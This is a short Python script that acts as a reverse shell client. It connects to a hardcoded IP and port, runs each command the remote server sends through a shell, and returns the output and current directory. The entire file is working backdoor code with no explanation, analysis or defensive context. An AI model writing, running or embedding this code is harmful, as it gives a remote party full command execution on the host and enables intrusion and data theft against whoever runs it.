import socket 
import os
import subprocess

sock = socket.socket()
ip = "192.168.43.219"
# ip = "127.0.0.1"
port = 5500

sock.connect((ip,port))

while True:
    server_msg = sock.recv(1024)

    if server_msg[:2].decode("utf-8") =="cd":
        os.chdir(server_msg[3:].decode("utf-8"))

    if len(server_msg) > 0 :
        cmd = subprocess.Popen(server_msg[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE ,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read()+cmd.stderr.read()
        output_str  = str(output_byte,"utf-8")
        current_WD = os.getcwd()+"> "
        print(output_str)

        sock.send(str.encode(output_str + current_WD))



